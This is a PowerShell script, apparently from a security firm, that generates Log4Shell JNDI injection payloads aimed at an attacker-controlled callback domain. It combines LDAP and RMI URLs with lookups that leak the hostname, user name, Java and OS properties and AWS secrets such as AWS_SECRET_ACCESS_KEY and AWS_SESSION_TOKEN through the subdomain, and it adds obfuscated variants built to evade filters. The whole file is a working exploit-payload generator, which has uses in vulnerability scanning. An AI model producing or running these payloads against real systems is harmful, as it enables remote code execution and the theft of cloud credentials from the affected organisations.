# Author: Scott Sutherland, NetSPI 2021
# Create-Log4jPayload -Domain "callback.domain.com" -Port 389
# Todo: encoding, more command variations, protocol variations, obfuscation variations?
# Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
function Create-Log4jPayload
(
    [Parameter(Position = 0)][System.String]$Domain,
    [Parameter(Position = 0)][System.String]$Port,
    [Parameter(Position = 0)][System.String]$Word = (1..10 | foreach {[char](Get-Random -min 97 -Maximum 122)}) -join ''
)
{
    # Create list of procotols
    $Protocol = new-object System.Data.DataTable 
    $null = $Protocol.Columns.Add("value")
    $null = $Protocol.Rows.Add("ldap")
    $null = $Protocol.Rows.Add("`${lower:l}`${lower:d}a`${lower:p}")
    $null = $Protocol.Rows.Add("rmi")

    # Create list of presubdomain values for postion 1
    $MidPos1 = new-object System.Data.DataTable 
    $null = $MidPos1.Columns.Add("value")
    $null = $MidPos1.Rows.Add("")
    $null = $MidPos1.Rows.Add("127.0.0.1#.")
    $null = $MidPos1.Rows.Add("localhost#.")

    # Create list of presubdomain values for postion 2
    $MidPos2 = new-object System.Data.DataTable 
    $null = $MidPos2.Columns.Add("value")
    $null = $MidPos2.Rows.Add("")
    $null = $MidPos2.Rows.Add("`${upper:l}`${upper:o}`${upper:g}.")
    $null = $MidPos2.Rows.Add("`${hostname}.")
    $null = $MidPos2.Rows.Add("`${sys:user.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:user.home}.")  
    $null = $MidPos2.Rows.Add("`${sys:user.dir}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.home}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vendor}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.version}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vendor.url}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.version}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.vendor}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.arch}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.version}.") 
    $null = $MidPos2.Rows.Add("`${env:username}.")
    $null = $MidPos2.Rows.Add("`${env:user}.")     
    $null = $MidPos2.Rows.Add("`${env:JAVA_VERSION}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SECRET_ACCESS_KEY}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SESSION_TOKEN}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SHARED_CREDENTIALS_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_WEB_IDENTITY_TOKEN_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_PROFILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_CONFIG_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_ACCESS_KEY_ID}.")   

    # Create list of end position values
    $EndPos = new-object System.Data.DataTable 
    $null = $EndPos.Columns.Add("value")
    $null = $EndPos.Rows.Add("")
    $null = $EndPos.Rows.Add("/")
    $null = $EndPos.Rows.Add("/$word")
    $null = $EndPos.Rows.Add(":$Port")
    $null = $EndPos.Rows.Add(":$Port/")
    $null = $EndPos.Rows.Add(":$Port/$word")

    # Payload variations
    $PayloadVariations = new-object System.Data.DataTable 
    $null = $PayloadVariations.Columns.Add("payload")


    # Generate Payload Variations
    $Protocol | Select-Object value -ExpandProperty value |
    Foreach {    
        $CurrentProtocol = $_       
        $MidPos1 | Select-Object value -ExpandProperty value |
        Foreach{
            $CurrentMidPos1 = $_         
            $MidPos2 | Select-Object value -ExpandProperty value | 
            Foreach{
                $CurrentMidPos2 = $_          
                $EndPos | Select-Object value -ExpandProperty value |
                foreach{
                    $CurrentEndPos = $_
                    $null = $PayloadVariations.Rows.Add("`${jndi:" + $CurrentProtocol + "://" + $CurrentMidPos1 + $CurrentMidPos2 + $domain + $CurrentEndPos + "}")
                }   
            }      
        }       
    }

    # Add baseline obfuscation examples 
    $null = $PayloadVariations.Rows.Add("`${`${lower:jndi}:`${lower:rmi}://$Domain/$word}")
    $null = $PayloadVariations.Rows.Add("`${`${lower:`${lower:jndi}}:`${lower:rmi}://$Domain/$word}")
    $null = $PayloadVariations.Rows.Add("`${`${lower:j}`${lower:n}`${lower:d}i:`${lower:rmi}://$Domain/$word}")
    $null = $PayloadVariations.Rows.Add("`${jndi:`${lower:l}`${lower:d}a`${lower:p}://$Domain/$word}")
    $null = $PayloadVariations.Rows.Add("`${jndi:ldap:`${upper:/}`${upper:/}$Domain`:$port/$word}")
    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain}")  

    # Show variations
    $PayloadVariations

    # Show variation count
    $PayloadCount = $PayloadVariations.payload.Count
    Write-Verbose "$PayloadCount payloads were generated"

    # Clear Tables
    $Protocol.Rows.Clear()
    $MidPos1.Rows.Clear()
    $MidPos2.Rows.Clear()
    $EndPos.Rows.Clear()
}
